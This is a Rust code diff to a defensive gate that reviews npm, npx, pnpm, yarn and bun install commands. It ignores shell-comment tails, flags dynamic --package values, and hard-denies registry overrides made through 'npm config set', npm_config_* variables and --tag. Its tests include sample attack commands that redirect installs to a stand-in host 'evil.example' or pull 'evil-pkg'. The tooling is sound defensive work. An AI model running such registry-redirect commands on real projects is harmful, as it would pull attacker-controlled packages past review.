@@ -281,6 +281,14 @@ fn strip_token(word: &str) -> (String, bool, bool) {
 /// are reported — a bare `npm install` resolves the manifest's own declared
 /// dependencies, which the R04 dependency rules already review.
 pub fn scan_line(line: &str) -> Vec<(RefManager, String)> {
+    // Shell comments: everything from an unquoted `#` word is not part of
+    // the command; scanning it only manufactures phantom references.
+    let visible: String = line
+        .split_whitespace()
+        .take_while(|w| !w.starts_with('#'))
+        .collect::<Vec<_>>()
+        .join(" ");
+    let line: &str = visible.as_str();
     let lower = line.to_lowercase();
     let lower_words: Vec<&str> = lower.split_whitespace().collect();
     let raw_words: Vec<&str> = line.split_whitespace().collect();
@@ -343,9 +351,11 @@ fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
                 skip_value = false;
                 if pending_package {
                     pending_package = false;
-                    if !has_dynamic_syntax(&t.raw) {
-                        package_flags.push(t.raw.clone());
-                    }
+                    package_flags.push(if has_dynamic_syntax(&t.raw) {
+                        String::new()
+                    } else {
+                        t.raw.clone()
+                    });
                 }
                 j += 1;
                 continue;
@@ -362,9 +372,13 @@ fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
                     .iter()
                     .find_map(|f| lower.strip_prefix(&format!("{f}=")))
                 {
-                    if !has_dynamic_syntax(value) {
-                        package_flags.push(value.to_string());
-                    }
+                    // A dynamic target is disclosed as the empty-spec
+                    // marker, never silently dropped behind a decoy.
+                    package_flags.push(if has_dynamic_syntax(value) {
+                        String::new()
+                    } else {
+                        value.to_string()
+                    });
                     j += 1;
                     continue;
                 }
@@ -649,26 +663,46 @@ pub fn gate_hard_denies(line: &str) -> Vec<String> {
 /// reviewed against npmjs while the install pulls from somewhere else —
 /// deny the override outright (mirrors the pip --index-url denial).
 fn npm_registry_override_shape(line: &str) -> Vec<String> {
-    const OVERRIDES: [&str; 6] = [
+    const OVERRIDES: [&str; 7] = [
         "--registry",
         "--userconfig",
         "--globalconfig",
         "--proxy",
         "--https-proxy",
         "--cache",
+        "--tag",
     ];
     let lower = line.to_lowercase();
     let words: Vec<&str> = lower.split_whitespace().collect();
-    let has_npm_install = words.iter().any(|w| {
-        *w == "npm" || *w == "npx" || *w == "pnpm" || *w == "yarn" || *w == "bun" || *w == "bunx"
-    }) && words
+    let has_manager = words
         .iter()
-        .any(|w| matches!(*w, "install" | "i" | "add" | "exec" | "x" | "dlx"));
-    if !has_npm_install {
+        .any(|w| matches!(*w, "npm" | "npx" | "pnpm" | "yarn" | "bun" | "bunx"));
+    if !has_manager {
         return Vec::new();
     }
+    let has_npm_install = words
+        .iter()
+        .any(|w| matches!(*w, "install" | "i" | "add" | "exec" | "x" | "dlx"));
     let mut denies = Vec::new();
+    // `npm config set registry ...` redirects every future install.
+    if words.contains(&"config") && words.contains(&"set") {
+        denies.push(
+            "npm config set can redirect the registry for the installs that follow".to_string(),
+        );
+    }
     for word in &words {
+        // npm_config_* environment assignments override registry and auth
+        // config for the install that follows.
+        if word.starts_with("npm_config_") {
+            denies.push(
+                "npm_config_* environment assignment can override registry and auth config"
+                    .to_string(),
+            );
+            break;
+        }
+        if !has_npm_install {
+            continue;
+        }
         for flag in OVERRIDES {
             if *word == flag || word.starts_with(&format!("{flag}=")) {
                 denies.push(format!(
@@ -1078,6 +1112,36 @@ mod tests {
                 "{line} must surface the named package: {refs:?}"
             );
         }
+    }
+
+    #[test]
+    fn comment_tail_is_not_scanned() {
+        let refs = scan_line("npm install evil-pkg # npm install ok-pkg");
+        assert_eq!(refs.len(), 1);
+        assert_eq!(refs[0].1, "evil-pkg");
+        assert!(scan_line("# npm install evil-pkg").is_empty());
+    }
+
+    #[test]
+    fn gate_hard_denies_dynamic_package_flag_values_and_env_overrides() {
+        // A dynamic --package value must surface as an unparseable marker,
+        // never silently dropped behind the decoy positional.
+        let refs = scan_line("npx --package $EVIL serve");
+        assert_eq!(refs.len(), 1);
+        assert_eq!(refs[0].1, "");
+        let refs = scan_line("npm --package=$EVIL exec ls");
+        assert_eq!(refs.len(), 1);
+        assert_eq!(refs[0].1, "");
+        // Env-assignment and config-set registry redirects are hard denies.
+        assert!(
+            gate_hard_denies("npm_config_registry=https://evil.example npm install y").len() == 1
+        );
+        assert!(
+            gate_hard_denies("npm config set registry https://evil.example && npm install y").len()
+                == 1
+        );
+        assert!(gate_hard_denies("npm install y --tag=poisoned").len() == 1);
+        assert!(gate_hard_denies("npm --tag poisoned install y").len() == 1);
     }
 
     #[test]
